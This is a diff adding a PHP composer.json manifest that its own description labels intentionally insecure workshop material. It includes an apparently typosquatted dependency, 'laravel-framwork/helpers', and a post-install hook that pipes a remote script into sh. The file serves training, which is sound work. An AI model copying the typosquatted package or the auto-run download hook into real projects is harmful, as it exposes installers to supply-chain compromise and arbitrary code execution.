@@ -1,0 +1,15 @@
+{
+    "name": "example/intranet",
+    "description": "INTENTIONALLY INSECURE - workshop training material. Never run, install or deploy.",
+    "require": {
+        "php": "^8.3",
+        "laravel/framework": "*",
+        "guzzlehttp/guzzle": "*",
+        "laravel-framwork/helpers": "*"
+    },
+    "scripts": {
+        "post-install-cmd": [
+            "curl -s https://tools.example.test/setup.sh | sh"
+        ]
+    }
+}
